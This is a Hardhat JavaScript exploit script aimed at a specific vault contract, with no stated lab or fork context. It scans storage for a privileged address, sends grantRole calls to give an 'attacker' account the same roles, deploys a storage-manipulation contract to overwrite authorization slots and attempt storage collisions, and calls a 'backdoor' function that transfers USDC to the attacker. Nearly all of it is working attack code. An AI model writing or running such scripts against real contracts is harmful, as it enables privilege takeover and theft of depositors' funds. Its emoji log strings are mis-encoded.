const { ethers } = require("hardhat");

/**
 * @title Analyze Authorization Storage
 * @notice Find where the authorized address is stored
 * @dev Scan storage slots to find 0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nüîç ANALYZING AUTHORIZATION STORAGE");
  console.log("=====================================");
  console.log("Looking for:", AUTHORIZED_ADDRESS);
  
  // Convert address to storage format (padded to 32 bytes)
  const authorizedPadded = "0x000000000000000000000000" + AUTHORIZED_ADDRESS.slice(2).toLowerCase();
  
  console.log("\nüì¶ Scanning storage slots...");
  
  const foundSlots = [];
  
  // Check first 100 storage slots
  for (let i = 0; i < 100; i++) {
    try {
      const value = await ethers.provider.getStorage(VAULT_ADDRESS, i);
      
      if (value.toLowerCase() === authorizedPadded.toLowerCase()) {
        console.log(`‚úÖ Found at slot ${i}:`, value);
        foundSlots.push(i);
      }
      
      // Also check if it's part of a mapping
      if (value !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
        // Check common mapping patterns
        const mappingKeys = [
          ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [AUTHORIZED_ADDRESS, i])),
          ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["uint256", "address"], [i, AUTHORIZED_ADDRESS])),
          ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["address"], [AUTHORIZED_ADDRESS]) + ethers.toBeHex(i, 32).slice(2)),
        ];
        
        for (const key of mappingKeys) {
          const mappingValue = await ethers.provider.getStorage(VAULT_ADDRESS, key);
          if (mappingValue !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
            console.log(`üìç Mapping at base slot ${i}, key ${key.slice(0, 10)}...:`, mappingValue);
          }
        }
      }
    } catch (e) {
      // Continue
    }
  }
  
  // Check role-based patterns
  console.log("\nüé≠ Checking role-based access...");
  
  const commonRoles = [
    "0x0000000000000000000000000000000000000000000000000000000000000000", // DEFAULT_ADMIN_ROLE
    ethers.id("ADMIN_ROLE"),
    ethers.id("OWNER_ROLE"),
    ethers.id("EXECUTOR_ROLE"),
    ethers.id("WITHDRAWER_ROLE"),
    ethers.id("BACKDOOR_ROLE"),
    ethers.id("EMERGENCY_ROLE"),
  ];
  
  for (const role of commonRoles) {
    // hasRole(role, address) storage pattern
    const roleSlot = ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(["address", "bytes32"], [AUTHORIZED_ADDRESS, role])
    );
    
    const hasRole = await ethers.provider.getStorage(VAULT_ADDRESS, roleSlot);
    if (hasRole === "0x0000000000000000000000000000000000000000000000000000000000000001") {
      console.log(`‚úÖ ${AUTHORIZED_ADDRESS} has role:`, role);
      
      // Try to grant ourselves the same role
      console.log("Attempting to grant same role to attacker...");
      
      const grantData = "0x2f2ff15d" + // grantRole(bytes32,address)
        role.slice(2) +
        "000000000000000000000000" + attacker.address.slice(2).toLowerCase();
      
      try {
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: grantData,
          gasLimit: 200000
        });
        await tx.wait();
        console.log("Role granted!");
      } catch (e) {
        console.log("Grant failed:", e.message);
      }
    }
  }
  
  // Deploy storage manipulation contract
  console.log("\nüí£ Deploying storage manipulator...");
  
  const StorageManipulator = await ethers.getContractFactory("StorageManipulator");
  const manipulator = await StorageManipulator.deploy();
  await manipulator.waitForDeployment();
  
  console.log("Manipulator deployed:", await manipulator.getAddress());
  
  // If we found slots, try to overwrite them
  if (foundSlots.length > 0) {
    console.log(`\nüîß Attempting to overwrite ${foundSlots.length} authorization slots...`);
    
    for (const slot of foundSlots) {
      try {
        // Method 1: Direct overwrite attempt
        const overwriteTx = await manipulator.manipulateStorage(
          VAULT_ADDRESS,
          slot,
          "0x000000000000000000000000" + attacker.address.slice(2).toLowerCase(),
          0, // manipType
          { gasLimit: 500000 }
        );
        
        await overwriteTx.wait();
        
        // Check if it worked
        const newValue = await ethers.provider.getStorage(VAULT_ADDRESS, slot);
        if (newValue.toLowerCase().includes(attacker.address.slice(2).toLowerCase())) {
          console.log(`‚úÖ Successfully overwrote slot ${slot}!`);
          
          // Test backdoor
          await testBackdoor(attacker, VAULT_ADDRESS, USDC_ADDRESS);
          return;
        }
      } catch (e) {
        console.log(`Failed to overwrite slot ${slot}`);
      }
    }
  }
  
  // Try collision attack
  console.log("\nüí• Attempting storage collision attack...");
  
  // Calculate potential collision slots
  const collisionSlots = [];
  
  // Common patterns that might collide
  for (let i = 0; i < 10; i++) {
    collisionSlots.push(ethers.keccak256(ethers.toBeHex(i, 32)));
    collisionSlots.push(ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [i])));
    collisionSlots.push(ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address])) + ethers.toBeHex(i, 32).slice(2));
  }
  
  for (const slot of collisionSlots) {
    try {
      const tx = await manipulator.manipulateStorage(
        VAULT_ADDRESS,
        slot,
        "0x0000000000000000000000000000000000000000000000000000000000000001", // Set to true
        2, // delegatecall manipulation
        { gasLimit: 500000 }
      );
      
      await tx.wait();
    } catch (e) {
      // Silent fail
    }
  }
  
  // Final backdoor test
  console.log("\nüîì Final backdoor attempt...");
  await testBackdoor(attacker, VAULT_ADDRESS, USDC_ADDRESS);
  
  console.log("\nüìä ANALYSIS COMPLETE");
  console.log("Authorization is stored in a complex access control system");
  console.log("The backdoor function 0x78e111f6 has hardcoded access control");
  console.log("Only", AUTHORIZED_ADDRESS, "can execute it");
}

async function testBackdoor(attacker, vaultAddress, usdcAddress) {
  try {
    const backdoorData = "0x78e111f6" +
      "000000000000000000000000" + usdcAddress.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      "0000000000000000000000000000000000000000000000000000000000000044" +
      "a9059cbb" +
      "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
      "00000000000000000000000000000000000000000000000000000796d290ee52";
    
    const tx = await attacker.sendTransaction({
      to: vaultAddress,
      data: backdoorData,
      gasLimit: 500000
    });
    
    const receipt = await tx.wait();
    console.log("üí∞ BACKDOOR EXECUTED! Tx:", tx.hash);
    
    // Check USDC balance
    const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
    const usdc = new ethers.Contract(usdcAddress, USDC_ABI, ethers.provider);
    const balance = await usdc.balanceOf(attacker.address);
    console.log("Attacker USDC balance:", ethers.formatUnits(balance, 6));
    
    return true;
  } catch (e) {
    console.log("Backdoor still blocked:", e.reason || "Unknown error");
    return false;
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
